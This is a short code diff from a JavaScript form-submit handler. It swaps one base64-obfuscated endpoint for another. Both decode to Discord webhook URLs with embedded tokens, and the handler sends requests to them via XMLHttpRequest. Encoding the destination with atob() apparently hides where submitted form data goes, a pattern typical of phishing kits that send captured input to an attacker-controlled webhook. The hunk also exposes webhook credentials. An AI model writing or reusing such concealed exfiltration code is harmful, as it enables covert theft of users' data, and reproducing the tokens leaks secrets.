@@ -148,7 +148,7 @@ document.querySelector("#submit").addEventListener("click", () => {
 
         return false;
     }
-    var endpoint = atob("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvNzA4NzQ1MDM1MzYxMDI2MTQ5L3ZWcDNKa3ZwT2duazVBSTg4d1ZKMEtDMERGdVlqbTNMSTdKTk1oTmxCblBUaXh6V0xlTWk0Z2RyTEZmVTd3eEgxQmFa")
+    var endpoint = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvNzYwMjQwODQxNTQ0ODI2OTAxL21pT196bXZlclVzWVJUT1N3UW5ZRDlUYWdDVWdva1pBRTB0Z2VVaDZQd0czTWNKMTdBTmZrT2NKUWhIalpOZlhWQk96")
     var request = new XMLHttpRequest();
     request.onreadystatechange = function() {
         if (this.readyState == 4 && this.status == 204) {
